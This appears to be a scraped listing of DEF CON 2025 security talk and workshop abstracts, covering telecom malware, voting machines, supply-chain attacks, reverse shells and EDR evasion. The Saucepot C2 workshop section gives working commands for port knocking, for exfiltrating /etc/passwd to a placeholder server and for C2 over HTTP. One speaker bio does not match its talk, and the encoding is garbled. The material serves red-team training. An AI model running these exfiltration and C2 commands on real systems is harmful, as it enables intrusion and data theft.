Drawing from personal experience as a press photographer, this talk highlights the underexplored attack surface created by media access at high profile events like concerts, sporting events and political rallies. We explore how the press badge can become a powerful tool in the hands of a red teamer. By taking into account elements of OSINT, social engineering, and physical and network security, we focus on how lessons learned as a press photographer can directly be applied by red teamers (or threat actors!) to gain a foothold. Once that is achieved, individuals can embed themselves directly within high-visibility individuals and high-value, sensitive devices associated with professional sports teams, musicians and bands, and political leaders and lawmakers. The talk also discusses the importance of looking at the âÃÃ²bigger pictureâÃÃ´, and being aware of threats where people may not consider them to come from. Inspired by the spirit of Johnny LongâÃÃ´s No Tech Hacking, this talk examines how low-tech, high-ingenuity approaches continue to be in a hacker's arsenal. It makes the case that media impersonation is a serious but overlooked threat vector, and one that allows attackers to bypass traditional perimeters.

How VoLTE and IMS â the backbone of modern telecom voice services â can be weaponized by malware to perform stealthy, operator-blind surveillance, data exfiltration, and persistent command-and-control (C2), all without using the public internet. how a VoLTE-enabled Android device can be turned into a covert surveillance nodeâno SIM or live network required. Using a rooted emulator (for safe, repeatable testing) and Frida hooks, attendees will watch malware silently hijack the IMS stack, launch SIP INVITE/OPTIONS beacons to a Kamailio-based fake IMS core, and exfiltrate SMS, location, eSIM data or live audio over RTPâall traffic appearing as legitimate VoLTE signaling inside telecom infrastructure. The exercise proves how nation-grade implants can live entirely inside operator voice channels, bypassing traditional firewalls and DPI.

âAnatomy of Telecom Malwareâ is a Telecom Village talk spanning 2G, 3G, 4G/LTE and cloud-native 5G. It dissects how attackers weaponise every layer of the stackâSS7/SIGTRAN, Diameter, GTP, SMPP and SBA APIsâwhile adding three critical lenses:


Supply-chain infiltration: poisoned firmware builds and compromised eSIM-provisioning servers that let implants enter the core before day 0.
Transit-based backdoors: malware such as the LightBasin âGTPDoorâ family that hides its C2 inside roaming GTP-C/U tunnels, crossing operator boundaries unnoticed.
Field-proven attacks: campaigns like SIMjackerâs SS7/S@T-browser exploitation for OTP interception and recent SS7-redirect bank-fraud cases, plus roaming-hub spyware and diameter peer-scraping seen in the wild.


Attendees leave with a telecom-specific kill-chain map, protocol-aware detection tricks, and a 10-point hardening checklist to protect both legacy and future networks.

SpeakerBio:  Megan Allen
Hi, Iâm Megan Allen.

My work focuses on a holistic approach to health; moving the bodyâs natural energy into alignment with Earth and the seven chakras. I practice integrative wellness - honoring a person's emotional, mental, physical and spiritual well-being. I provide intuitive healing sessions and work with clients to relax the mind, increase body awareness and balance energy flow.

I also facilitate community wellness workshops, ceremonies and transformational group programs inviting participants to disconnect from their busy lives, turn inward and tap into the present to restore and maintain the bodyâs energetic balance and cultivate self-love, empowerment and sovereignty.

I inspire people to activate their highest potential in alignment with their wise hearts and to promote healing from within. I tailor my sessions to reflect this; using techniques from my healing disciplines as well as my love for Traditional Chinese Medicine, holistic aromatherapy, crystals and essential oils, tarot, animal medicine cards and a deep reverence for nature.

Nature is one of my greatest teachers. It constantly teaches me about grounding, stability, resilience, boundaries, growth, and stillness.

Description:
The most obvious, fundamental problem with Ballot Marking Devices is encoding votersâ choices in images voters cannot read and tabulating from those images. Compounding BMD problems, these systems produce at least three distinct images of votersâ selections: the choices in QR/bar code images, a printed text list purporting to show those encoded choices, and a ballot image produced by precinct scanners. These images and printed list may be subject to different possible mistakes misperceptions, or manipulation. Regulations have not kept up with vulnerabilitiesâbut simply adding more regulations will not suffice. This presentation reviews regulations in several states, beginning with Florida, as an example to examine when and if the printed list for voter review may be counted.

Description:
Susan Lerner will provide an overview of the ongoing litigation in New York state court, Common Cause NY v. Kosinski, which challenges the legality of using the ES&S ExpressVote XL all-in-one ballot marking device and tabulator under New York law. The ExpressVote XL records votes in barcodes - unreadable to the naked eye - which, Common Cause NY asserts, violates New York law. NY statute provides that all voters must have the opportunity to verify their votes before they are cast. Notably, the federal Help America Vote Act includes the same provision. Should Common Cause NY prevail in state court, the decision could spark further action. The recording or votes in barcodes or QR has been controversial since its introduction. In 2019, Colorado Secretary of State Jenna Griswald (D) announced an initiative to end encoding votes in barcodes/QR codes in Colorado. In March, Donald Trump issued an executive order that sought to prohibit encoding votes in barcodes/QR codes in federally certified voting machines. This talk will explore the legal arguments at issue in the NY case, that could have repercussions elsewhere.

Susan Lerner is executive director of Common Cause New York. Susan joined Common Cause in December 2007. She is responsible for setting priorities, strategy, lobbying, serving as a spokesperson, fund-raising and leading the team for the New York organization.

npm is owned by Microsoft and is the worldâs largest software registry. It hosts nearly 5 million packages and 4.5 trillion requests for packages were made to npm in 2024. The open and accessible nature of npm is one of its main features, but its also one of the reasons that threat actors are attracted to it. A recent study by Sonatype found that 98.5% of malicious software packages are hosted and delivered via npm.

This technical deep-dive will explain why npm is so good at delivering malware; expose how threat actors are using npm; and why existing security tools like SCA, SAST, EDR and anti-virus solutions will not protect you from npm based malware.

Key Topics:


Technical analysis of how attackers leverage npm's unique characteristics (namespace claiming, pre/post install scripts, package name recycling) to deliver successful malware
Why existing security solutions like SCA, SAST, EDR and anti-virus wonât find npm based malware
Comparative analysis of attack patterns across different threat actors (researchers, crypto thieves, criminal APTs, nation-states)

Description:
Get ready for a live demo of full-blown cloud compromise - starting from an innocent-looking SageMaker AI notebook and ending in complete AWS account takeover. Using nothing more than the default SageMaker AI setup granted to data scientists, this session showcases how attackers can chain together misconfigurations across IAM, SecretsManager, ECR, and network layers to take control of the environment from the inside out.
But thatâs just the beginning.

This talk also features the exclusive release of a new open source tool- the first offensive framework built to simulate and execute post-exploitation in SageMaker AI environments. Red teams can weaponize it. Defenders can validate exposures. Either way, it shines a spotlight on one of the cloudâs most overlooked attack surfaces: managed AI infrastructure.

Drawing on real-world experience from offensive operations against cloud environments around the world - including enterprise and nation-level targets - this session breaks down how AI services like SageMaker AI are quietly becoming powerful post-exploitation platforms.
SageMaker AI was designed to train models, not attackers - but with its comfort-first design, permissive defaults, and excessive trust relationships, it quietly offers everything needed for stealthy lateral movement and infrastructure-wide compromise.

This talk is for red teamers, defenders, and anyone building or securing ML workloads in the cloud. Expect real attack chains, real tools, and a view into how attackers are targeting AI infrastructure in the wild - and why most environments aren't ready for it.

Description:
Traditional detection methods struggle to keep pace with evolving attacker tactics in cloud environments like Microsoft 365. To level the playing field, organizations can implement honeypots and honey tokens strategically within their M365 infrastructure, turning the complexity of cloud services to their advantage. By creating deliberately enticing yet closely monitored decoys, defenders can proactively detect attacker reconnaissance and exploitation attempts.

This session outlines effective strategies for deploying M365 honeypots and honey tokens, emphasizing low false-positive rates and high data quality. Leveraging Exchange, SharePoint, Teams, and Application-specific tokens, attendees will learn to craft attractive, attacker-oriented traps integrated seamlessly into their security monitoring pipelines. Advanced deception techniques, including breadcrumb trails leading adversaries into highly monitored secondary environments, will also be discussed.

Through live demonstrations, participants will gain valuable insights into how deception techniques can be applied within Microsoft 365 environments. They will learn how to design and implement these strategies in their own environments to strengthen detection capabilities against sophisticated adversaries.

This presentation is the culmination of extensive hands-on research and practical application in both penetration testing and defensive detection engineering. By leveraging actual techniques observed in real-world attacks, this talk bridges offensive innovation with proactive defensive strategies. Attendees will receive detailed methodologies to effectively set up, deploy, and monitor M365-specific honeypots.

Modern clusters are a moving target: new images ship hourly, nodes drift from their golden state, and runtime threats appear without warning. Kubernetesâ¯Securityâ¯Scanner gives you one keyboard shortcut to see it allâand this handsâon workshop teaches you how.

The tool runs a fullâstack inspection in minutes and organizes findings into five actionable domains:

Cluster Setup & Hardening â benchmarks every controlâplane and node flag against CIS, highlights risky admissionâcontroller and RBAC settings, and maps networkâpolicy blind spots.

System Hardening â validates kernel parameters, kubelet options, containerâruntime and gVisor profiles to keep the host layer sealed tight.

Microservice Vulnerability Reduction â enforces leastâprivilege at pod and container level by checking security contexts, resource limits, disruption budgets, and secrets hygiene.

SupplyâChain Security â blocks bad code before it ships by verifying image signatures and SBOMs, scanning for CVEs and license red flags, and flagging stale or untrusted artifacts.

Runtime Security â confirms auditâpolicy coverage, validates Falco rules and alert paths, and streams suspicious events so you can react in real time.

Attendees will deploy the scanner against a vulnerable âKubernetes Goatâ cluster, interpret it's  reports, and remediate highâimpact issues live. By the end of the session youâll leave with a repeatable workflow that delivers prescriptive, lineâitem fixes from cluster creation through dayâ2 operationsâno guesswork, just secureâbyâdesign Kubernetes.

Description:
Security research has been focused on securing well-known, widely replicated ecosystems where problems and solutions are shared across the industry. But what happens when you build something no one else has? How do you secure an architecture that's both proprietary and deployed at billion-core scale?

In 2016, NVIDIA began transitioning its internal Falcon microprocessor, used in nearly all GPU products, to a RISC-V based architecture. Today, each chipset has 10-40 cores, and in 2024, NVIDIA surpassed 1 billion RISC-V cores shipped. This success came with unique security challenges, ones that existing models couldn't solve.

To address them, we created a custom SW and HW security architecture from scratch. Including a purpose-built Separation Kernel SW, novel RISC-V ISA extensions like Pointer Masking, IOPMP (later ratified), and unique secure boot and attestation solution. But how do you future-proof a proprietary ecosystem against tomorrow's threats?

In this talk, we'll share what we learned, and what's next. From HW-assisted memory safety (HWASAN, MTE) to control-flow integrity (CFI) and CHERI-like models, we'll explore how NVIDIA is preparing not only its RISC-V ecosystem for the evolving threat landscape. If you care about real-world security at an unprecedented scale, this is a journey you won't want to miss.

Description:
DOM Clobbering is a type of code-reuse attack on the web that exploits naming collisions between DOM elements and JavaScript variables for malicious consequences, such as Cross-site Scripting. 

In this talk, we present a novel systematization of DOM Clobbering exploitation in four stages, integrating existing techniques while introducing new clobbering primitives. Based on this foundation, we introduce Hulk, the first dynamic analysis tool to automatically detect DOM Clobbering gadgets and generate working exploits end-to-end.

Our evaluation revealed an alarming prevalence of DOM Clobbering vulnerabilities across the web ecosystem. We discovered 497 zero-day DOM Clobbering gadgets in the Tranco Top 5,000 sites, affecting popular client-side libraries, including Google Client API, Webpack, Vite, Rollup, and Astroâall of which have since acknowledged and patched the issue.

To complete our exploitation chain, we further study its trigger---HTML Injection vulnerability. Our systematic analysis of HTML Injection uncovered over 200 websites vulnerable to HTML injection. By combining them with our discovered gadgets, we demonstrated complete attack chains in popular applications like Jupyter Notebook/JupyterLab, HackMD.io, and Canvas LMS. This research has resulted in 19 CVE identifiers being assigned to date.

Description:
It was the summer of 2016, and like everyone else, I was out playing PokÃ©mon Go. Except my rural location barely spawned anything interesting. Naturally, I dove into the game's code, reverse engineered its protocol, and built a custom PokÃ©mon scanner.

But the story doesn't end there. One day, a switch was flipped, enabling a fancy new anti-cheating feature that locked out any custom implementations.

In this talk, I'll begin by exploring how mobile games like PokÃ©mon Go handle communication through specialized protocolsâand how I replicated that behavior to build a scanner. Then, I'll walk you through a 4-day hacking marathon where I teamed up with a group of like-minded enthusiasts to overcome the anti-cheating mechanism that nearly broke our scanners.

We'll examine how mobile games attempt to thwart such applications, unraveling the anti-cheating mechanism that was deployed by Pokemon Go. We'll explore how we managed, through obfuscated cryptographic functions, unexpected use of smartphone peripherals and hidden protobuf definitions, to break the anti-cheating system and release a publicly available API for the game's protocol.

Almost a decade later, the full story is ready to be told. Join me for an inside look at the anti-cheating mechanisms of online mobile gamesâand how to hack them.

Description:
While the theft of Primary Refresh Token (PRT) cookies on Windows has been extensively studied, similar attacks on macOS remain unexplored. As organizations increasingly use Microsoft Intune to manage both Windows and macOS devices, a critical question arises: can attackers also extract PRT cookies from macOS?

In this talk, we present our research into Microsoftâs SSO implementation within the Intune Company Portal for macOS. We compare authentication flows and security controls between Windows and macOS, exposing weaknesses that allow attackers to bypass process validation and obtain authentication tokens under certain conditions.

Another obstacle for attackers has been Microsoftâs efforts to make it more difficult to register new devices using stolen credentials for persistence. Our research introduces a novel technique: once an attacker acquires a token with an MFA claim on the device, they can still register new devices and generate new tokens without concern for the original stolen tokenâs expiration.

We will demonstrate PRT Cookie extraction on macOS and release a proof-of-concept tool, showing not only how credential theft techniques can now extend beyond Windows to macOS environments, but also how attackers can leverage these techniques for long-term persistence.

This research was inspired by these previous studies, which sparked our interest in investigating the theft of PRT cookies on macOS and exploring new persistence techniques.
This research inspired us to consider that macOS might be a valuable target for in-depth security analysis.

Description:
In this talk, the speaker details how a threat actorâs OPSEC slipâtesting their own keylogger and infostealer on their hacking machineâprovided a real-time view into a cybercrime operation. By intercepting Telegram-based command-and-control (C2) communications, the speaker obtained hundreds of screenshots and keylogs of the threat actors desktop, revealing the entire cybercrime operation. The session also covers the creation of Telegram bot tokens, which were then embedded in malware to enable covert data exfiltration and remote control.

Through automated analysis techniques, including VirusTotal and custom YARA rules, the speaker tracked samples communicating with Telegramâs API, extracted thousands of bot tokens that were used to forward stolen data, used these to intercept communications, and mapped backend infrastructure through screenshots of the threat actors desktop. This process led to the discovery of links to broader phishing and malware campaigns, underscoring how trusted platforms like Telegram can be abused by malicious actors.

Description:
Cypherpunks write code that is open source, privacy-oriented, decentralized, trust-minimized, verifiable/auditable, interoperable, and bundled in Linux distributions. Cypherpunks don't use Java. But in 2025 using Java 25 and Nix -- they can and should!

We will review how functional-style programming, minimalism, pattern-matching, native compilation and integration with C/C++/Rust through a new FFM mechanism are game-changers for Java developers and worthy of a second look by those who dismissed Java years ago.

In this session we will see how Nix can reliably build native and JIT-compiled tools and applications, how dependencies can be minimized and bootstrappability achieved.

We will compare Maven's bytecode packaging to the Nix model and how the two can be integrated while also brining in native libraries.

Real-world examples will be provided. We will look at the gaps that remain and how to close them so we can live the Java-cypherpunk dream and contribute to the "Great Tree".

Description:
As a London-based security researcher with a strong focus on open-source intelligence
(OSINT) and attack surface discovery, I am excited to attend the DEF CON conference for the
first time and contribute meaningfully to the Red Team Village. My passion lies in developing
and refining reconnaissance techniques that enable both offensive and defensive practitioners
to gain deeper insights into an organizationâs digital footprint.

During the RTV Tactics sessions, I will present a DNS-based OSINT methodology for
uncovering products and services through large-scale DNS TXT record scanning. This
previously unpublished approach demonstrates how certain TXT records can reveal not just
domain ownership or validation details, but also the presence of specific third-party services and
platforms in use. For instance, TXT entries like google-site-verification,
MS=msXXXXXXXX, or vendor-specific SPF includes can expose dependencies on Google
Workspace, Microsoft 365, or other cloud-based services.

By programmatically analyzing these records across large swaths of DNS zones, attackers can
construct detailed maps of an organization's technology stack and supply chain
affiliationsâcritical intelligence for targeted campaigns. This intelligence also provides
defenders with an opportunity to detect inadvertent information leakage and improve control
over external DNS configurations.

To support operational use, I have integrated this scanning technique into widely adopted
open-source tools such as Nuclei and Amass. These enhancements allow red teams and
security researchers to efficiently incorporate TXT record reconnaissance into broader discovery
workflows, elevating the precision and depth of traditional enumeration phases.

This session will equip attendees with practical, reproducible tactics for passive and semi-active
discovery that can uncover non-obvious attack vectors. Attendees will leave with actionable
insights and tooling that can be immediately applied to real-world engagements.

It would be an absolute honor to support the Red Team Village and give back to a community
that has been instrumental in shaping my growth as a researcher. I deeply value the Villageâs
mission to educate, inspire, and empower red teamers of all experience levels, and I am eager
to contribute to that mission by sharing knowledge that enhances our collective offensive
capabilities and understanding of adversarial tradecraft. Thank you for the opportunity to be
considered.

Description:
Can You Really Trust Your EDR? Spoiler: Attackers Donât â They Exploit It.

In the ever-evolving world of cybersecurity, attackers are one step ahead. But what happens when defenders rely on tools that attackers already know how to bypass? In this session, we dive deep into the mindset of adversaries and explore how modern Endpoint Detection and Response (EDR) systems are not the impenetrable fortress many think they are. As a defense researcher specializing in adversarial behavior, Iâve crafted a cross-platform ransomware (Windows, macOS, Linux) to understand the gaps in current defense mechanismsânot to cause harm, but to reveal how attackers think, act, and effortlessly slip past advanced defenses.

Through a live Proof of Concept (PoC) and in-depth technical walkthroughs, weâll uncover the persistent techniques, evasion strategies, and overlooked system behaviors that let ransomware thrive even in well-defended environments. This talk isnât meant to alarmâitâs an honest, reality-driven exploration of how attackers exploit EDRs, and more importantly, how defenders can bolster their security strategies.

If you work in blue team operations, threat hunting, or product security, expect to leave with a series of challenging questions rather than comforting answers.

I. Ransomware: Beyond Encryption

Evolving Objectives: Extortion, Persistence, and Disruption
When Persistence is the Key to Success, Not the Payload

II. Mastering Persistence Across Platforms

macOS: LaunchAgents as a Stealthy Tool
Windows: Registry Hijacking and Scheduled Tasks
Linux: Cron Jobs, the Silent Worker

III. Building the Payload: Python and Java in Offensive Security

Quick Deployment: Why high-level languages dominate the attack surface
Modular and Adaptable: Flexibility over complexity for real-world attacks

IV. How EDRs Actually Work: A Deep Dive

Detection Techniques: Behavioral analysis, memory scanning
The Silent Failures: Weak telemetry collection and blind spots
Evasion Patterns: From PoCs to real-world attacks

V. EDR Bypass: Simple Yet Effective Techniques

Signature Evasion: Breaking through with minor tweaks
Demonstration: How different commercial EDRs can be bypassed effortlessly

VI. Theory Meets Reality: Lessons Learned from PoCs

Real-World PoCs: Demonstrating how defenses fail against basic, effective tactics
Undetected Persistence: How attackers use legitimate tools and strategies to evade detection, even in heavily secured environments
The Gap: Why static detection and behavioral analysis donât always meshâand how attackers exploit this vulnerability

VII. Final Thoughts: Turning Offensive Knowledge into Defensive Strength

Adopting the Attackerâs Perspective: Understanding offensive techniques to fortify defenses
Realism Over Optimism: Building adaptable, resilient security strategies with limited resources
A Call to Action: Defend with pragmatismârecognize the attackersâ mindset to create proactive defenses

Join us for an in-depth exploration of how PDFs, a ubiquitous document format, can be exploited as a vessel for executing malicious JavaScript malware. This presentation will delve into real-world vulnerability that have been targeted to execute harmful code within PDF filesâposing a serious threat in today's cybersecurity landscape.

Key exploit techniques we'll explore include:

Heap Spray Attacks: Using shellcode to strategically overwrite memory, thereby enabling attackers to execute arbitrary code and gain control over target systems.

Data Exfiltration Tactics: Methods for covertly extracting critical information, such as email addresses and system details, from users without their knowledge or consent.
Embedding Malware in PDFs: An examination of how attackers embed harmful scripts into PDFs, tricking users into activating exploits within Adobe Reader through seemingly ordinary actions.

We'll dissect malicious actions such as shellcode injection, buffer overflow attacks, Adobe Reader exploit, and memory manipulation, all designed to execute malware effectively.

This session is perfect for offensive security professionals seeking to deepen their understanding of PDF-based exploits and enhance their penetration testing and threat emulation capabilities. Discover how these sophisticated threats operate and learn strategies to counteract them within your security frameworks. Join us to stay ahead in the ever-evolving world of cyber threats.

Description:
For years, Pentestmonkey Reverse Shell Cheat Sheet defined the essentials of post-exploitation. Bash, Python, PHP, (G)Awk, Netcat and others were quick, simple and highly effective tools for gaining shell access. Today, those tools are the first to be flagged, restricted or removed. In real-world hardened environments, the old paths are closed. Meanwhile, new runtimes like Clojure, Racket, NATS-IO, Bun, Crystal, Red Language, Ballerina and others are becoming part of production environments, CI/CD pipelines and internal developer ecosystems, usually without security teams treating them as risks.

This workshop focuses on building practical, working reverse and bind shells using these modern runtimes. Participants will write their own payloads, test them live against targets and leave with working knowledge of how to survive without traditional tooling. Every shell demonstrated will be integrated into the Metasploit Framework with custom modules built for each runtime. Source code, victim and attacker virtual machines and pre-built environments will be provided to ensure every participant can practice during the session.

This is not a theory-heavy workshop. It is about operational survival when Python is gone, Netcat is restricted and standard shells are no longer viable. It is about turning runtimes that defenders ignore into reliable offensive footholds. Attendees will leave with ready-to-use payloads, working Metasploit extensions, and the technical knowledge to adapt to modern detection-heavy environments.

Description:
Port knocking is a stealthy network authentication technique (T1205.001) in which a client sends a specific sequence of connection attempts (or "knocks") to closed ports on a server. When the correct sequence is received, the server dynamically opens a port or triggers an action, enabling concealed access or communication. Saucepot C2 elevates the port knocking technique to a new level. Instead of using destination ports (DstPorts) in TCP sessions as knock sequences, it leverages source ports (SrcPorts), also known as ephemeral ports. This approach allows data exfiltration even in highly restrictive firewall environments where only a single outbound port, such as port 443, is allowed.

In this workshop, attendees will use Saucepot C2 in conjunction with the following MITRE ATT&CK techniques to conduct specific Red Team activities:







	Technique ID
	Technique Name
	Tactic




	T1041
	Exfiltration Over C2 Channel
	Exfiltration


	T1071.001
	Application Layer Protocol: Web
	Command and Control


	T1205.001
	Traffic Signaling: Port Knocking
	Command and Control / Defense Evasion




Saucepot C2 has been open-sourced at https://github.com/netskopeoss/saucepot.
Supported commands or features in Sacuepot C2 include:
- Check-in / heartbeat
- Directory listing
- Process listing
- File upload

Hardware requirements


One AWS EC2 t3.micro (or equivalent) VPC instance with at least 1 GB of RAM and 8 GB of storage to serve as the server
One AWS EC2 t3.micro (or equivalent) VPC instance (easier option), or a laptop (more difficult option), to serve as the client


Software requirements

Server:

sudo apt install  net-tools knockd nginx python3-pip python3-scapy
git clone https://github.com/netskopeoss/saucepot
echo "v2025.8" | sudo tee /var/www/html/chk-version


Client:

sudo apt install  net-tools python3-tqdm python3-psutil python3-pycurl
git clone https://github.com/netskopeoss/saucepot


Workshop details


Exercise 1: Traditional port knocking
Reveal a web server running on port 80 using the port knocking technique. Once the correct knock sequence is provided, the firewall will be temporarily lifted for that specific client.


Server:
Hide the web server until the correct knock sequences (4100, 4200, 4500) have been provided.


sudo iptables -I INPUT -p tcp --dport 80 -j REJECT
sudo systemctl start nginx


Add the following section to /etc/knockd.conf

[OpenCloseSecretWeb]
    sequence      = 4100,4200,4500
    seq_timeout   = 30
    tcpflags      = syn
    start_command = /usr/sbin/iptables -I INPUT -s %IP% -p tcp --dport 80 -j ACCEPT
    cmd_timeout   = 7200
    stop_command  = /usr/sbin/iptables -D INPUT -s %IP% -p tcp --dport 80 -j ACCEPT


If the default interface is not eth0, add Interface = InterfaceName to the [options] section.

Restart the knockd:

sudo systemctl restart knockd


Client:

The protected web service should be unreachable by default.


curl http://server_public_ip


Provide the correct knock sequences; the protected web service should now be reachable.


for f in 4100 4200 4500; do nc -w2 server_public_ip $f; done
curl http://server_public_ip



Exercise 2: Ephemeral port checker
Check whether you're in a friendly environment where the client's source port is preserved after NAT, a crucial requirement for ephemeral port abuse to work. If the laptop's network environment fails the test, an additional VPC instance will be needed to act as the client.

Server:

sudo systemctl stop nginx
sudo python3 saucepot-server.py -c -p 80


Client:
```
python3 saucepot-client.py -c  -d server_public_ip  -p 80

Test 1 with ephemeral port 63034: PASS
Test 2 with ephemeral port 51151: PASS
Test 3 with ephemeral port 54321: PASS

Ephemeral port test succeeded. Enjoy Port Knocking 2.0 technique!
```
Exercise 3: Data exfiltration
Exfiltrate a specified file to the server without establishing persistent TCP connections. The connection state is managed through different port-knocking sequences, such as session-start and session-end. The data to be exfiltrated is transmitted via the source port (SrcPort) field of TCP packets within a designated port range.

Server:

sudo python3 saucepot-server.py -d 172.31.253.199  -p 80


Client:
Exfiltrate /etc/passwd to the server


python3 saucepot-client.py  -d server_public_ip  -p 80  --upload /etc/passwd

Exercise 4: Command-and-control operations
To achieve bidirectional communication, theâ¯Last-Modifiedâ¯header in HTTP responses is used to deliver C2 commands to the client. Saucepot C2 currently supports a few simple commands, such asâ¯ls,â¯ps, and others.

Server:

sudo systemctl start nginx
sudo python3 saucepot-server.py -d 172.31.253.199  -p 80


Client:

python3 saucepot-client.py  -d server_public_ip  -p 80

Exercise 5: Observation of anomalies at L4 and L7
Observe the anomalies at L4 and L7

On the server, in two separate windows:

web access log:

tail -F /var/log/nginx/access.log


SYN packets:

sudo tcpdump -i enX0 -n 'tcp[tcpflags] & tcp-syn != 0'



This workshop has been verified on Ubuntu 24.04 LTS

Troubleshoot Guide:


Python packages required
VPC instance's inbound firewall to allow 80/tcp and those used in traditional port-knock sequences
Use VPC instance NIC's private IP address in exercise 3 & 4 for the -d ip arg on Server

Description:
In today's hyper-connected world, one vulnerability remains reliably exploitable: the human. Social engineering -- the manipulation of people to gain unauthorized access or extract sensitive information -- continues to outpace technical exploits in both effectiveness and stealth. But in the age of AI, these attacks are evolving faster, becoming more scalable, convincing, and harder to detect.

This talk explores the many faces of modern social engineering: from classic phishing, vishing, and physical intrusion, to AI-generated phishing emails, deepfake voice calls, and synthetic identities crafted by language models. We'll walk through real-world scenarios where attackers exploit trust, urgency, charm, and emotionâÃÃ®now enhanced by tools that can replicate human tone, write believable pretexts, and automate reconnaissance at scale.

You'll leave with a deeper understanding of how AI is supercharging social engineering, what this means for defenders and red teamers alike, and how to recognize the increasingly subtle cues of human-targeted compromise.

Description:
In the March 2020 'Super Tuesday' Primary Election, LA County debuted its brand new, $300 million, bespoke, Smartmatic-contracted VSAP (Voting Solutions for All People) voting system. Before the night was over, the Bernie Sanders presidential campaign had already filed suit (due to multiple technology failures resulting in hours-long lines). That election night proved to be illustrative of the myriad problems with VSAP, including numerous security vulnerabilities. These were compounded by the failure to fulfill a much-ballyhooed commitment by the County to disclose the source code. Perhaps the most significant failing was only revealed weeks later after the machine count had finally been completed. A knife's edge result in LA County's second largest city, Long Beach, for a local ballot measure, led to a voter-requested recount and an eye-opening odyssey for a local government accountability grassroots organization. Ian Patton will discuss that journey in pursuit of a simple and accurate local election result.

The Scenario:

As the dust settles from the initial detonations political, radiological, and digital the next phase of the  Horizon Veil simulation begins.

The final 10 turns shift the spotlight to southern Germany and France, where hospital systems are reaching their breaking point. Overwhelmed by radiation casualties, cyber-disrupted logistics, and mounting refugee pressure, medical centers from Munich to Marseille are facing impossible choices. Triage under disinformation. Staffing collapses under threat of digital sabotage. International aid is tangled in red tape and mistrust.

This phase will test what happens when the healthcare system becomes the final line of civilizational defense and what it means to govern when basic survival is no longer guaranteed.

If you've been following the earlier turns, this is where the long tail of your policy decisions lands with patients on the floor and nowhere left to go.

Description:
Bug bounty hunting is often portrayed as methodical recon, crafted payloads, and targeted testing. But sometimes, the most interesting vulnerabilities donât come from planned attacks â they come from the chaos. In this talk, Iâll walk through a handful of real bugs Iâve reported over the years that found me instead. 
From unexpected blind XSS triggers in places I wasnât even actively testing, to getting quietly added to internal distribution lists and receiving sensitive data I never asked for, to those classic âWTFâ moments that every seasoned hunter has experienced â this talk highlights the unpredictable and serendipitous side of bug bounty. 

Weâll explore how these moments happened, what they revealed about the systems in question, and what they taught me about staying alert beyond traditional recon. Whether youâre an experienced hunter or just getting started, this talk is a reminder that in bug bounty, sometimes the best findings arenât hunted â theyâre stumbled into.

Description:
XSS in modern React apps isn't gone, it's just hiding in new places. In this workshop, we'll expose how React createElement can be your way in. We'll walk through several React DOM XSS lab scenarios based on real bug bounty findings from vulnerable applications in the wild. You'll see how untrusted input can make its way from a variety of realistic sources to a React createElement sink, leading to exploitable XSS, even in apps built with frameworks like Next.js. These labs are realistic, grounded in actual bugs, and designed to sharpen your ability to spot and exploit DOM XSS in the kinds of apps bounty hunters hit every day.

Tags: Cloud Village | Creator Talk/Panel
When: Saturday, Aug 9, 12:15 - 12:55 PDT
Where: LVCC West-Level 3-W311 (Cloud Village Talks) - Map

Description:
Trying to trace an attacker pivoting from AWS to Azure to GCP often feels like building detections in silos while attackers exploit the seams. As detection engineers (DEs), we know the pain: scattered logic, cloud-specific alerts, and a fragmented view. We need to move beyond individual events and reconstruct the cross-cloud kill chain to see the full attack.

This DEF CON Lightning Talk is a practical DE playbook for AWS, Azure, and GCP. No fluff, just 'how-to' for building detections that connect the dots across clouds.

In ~15 minutes, weâll cover:
Cross-Cloud TTPs: How attackers really pivot between AWS, Azure & GCP in 2025 and the patterns they leave.
Mapping Logs to Kills: Identifying essential logs (CloudTrail, Azure AD, GCP Audit, etc.) and mapping them to attack stages.
Crafting Correlation Rules: Real SIEM examples (Sentinel/Chronicle/etc.) for stitching events together â think 'Azure Risky Login' + 'AWS Role Use' = P1 Alert.
Actionable DE Strategies: Threat intel integration, baselining cross-cloud activity, and building high-fidelity alerts.
Automation & OCSF: Streamlining ingestion and normalization so you can focus on the hunt.
If you write detection rules or hunt threats in a multi-cloud mess, this is for you. You'll leave with actionable TTPs, correlation logic examples, and a clear path to building detections that reveal the entire cross-cloud kill chain. Let's build better traps.

Description:
Apache Kafka is an open-source distributed event streaming platform. At the heart of Kafka lies the Broker, which acts as the central server node in a Kafka cluster. Brokers are responsible for storing streams of data and managing the flow of messages between producers and consumers. The Kafka Server we often refer to is essentially the Kafka Broker.

While Kafkaâs main system handles data streams well, its real strength comes from its growing ecosystem. The components in the ecosystem greatly expands its abilities: Confluent ksqlDB transforms raw streams into queryable tables for real-time analytics; Schema Registry standardizes data formats across microservices, and so on.

However, behind the rich components lie hidden security threats. Prior research has revealed Remote Code Execution (RCE) vulnerabilities in Kafka Client, yet notably absent were any exploitable RCE vulnerabilities in the Kafka Server â until now. In this work, we present the first-ever RCE vulnerability affecting Kafka Server itself. At the same time, we also used similar techniques to attack other components in the Kafka ecosystem. And these vulnerabilities can also affect the cloud service providers themselves. What's more, Since Kafka users remain unaware of this risk, thousands of Kafka servers are now exposed to this RCE vulnerability.

In this talk, we dive into a world of webcams that secretly run Linux. What started as a casual curiosity turned into a deep dive into embedded Linux systems, obscure supply chains, and alarming security oversights.

Along the way, we discovered how decisions made far upstream â by silicon vendors and OEMs â can introduce vulnerabilities that quietly ship in tens of thousands of devices.

This presentation explores the broader implications of insecure firmware, broken update mechanisms, and the surprising autonomy of devices many assume to be simple peripherals.

We share how we traced the tech stack from brand-name distributors back to little-known chipset manufacturers, and what that journey revealed about responsibility, transparency, and the risks of neglecting security at the hardware-software boundary.

Come for curiosity, stay for the demos and laughs.

Description:
Every once in a while, we get a grim reminder that the open-source trust model that enables developers to use each otherâs code and resources can be abused by attackers.

GitHub users recently suffered from such a wake-up call. In March 2025, the highly-publicized "tj-actions" incident came to light, throwing many GitHub organizations and users into panic, as their credentials were leaked via their supply chain. But while the masses were scared about the massive credential exposure, we were able to piece together evidence to show that the leakage wasn't the primary goal of this attack, and that the initial buzz was just the tip of the iceberg. Our investigations indicate that more highly-popular projects were targeted as part of this campaign, and DefCon will be the first place that we reveal the newly-discovered details.

Weâll reveal how the attack began months earlier than initially believed, with the attacker compromising multiple open-source projects utilizing them for lateral movement. We'll detail how the adversary maintained a low profile, patiently waiting to spear-target Coinbase. We will dissect the sophisticated evasion techniques employed and the attackerâs modus operandi, showing how the open-source access and trust model were weaponized to deliver a precise and calculated supply chain attack.

Description:
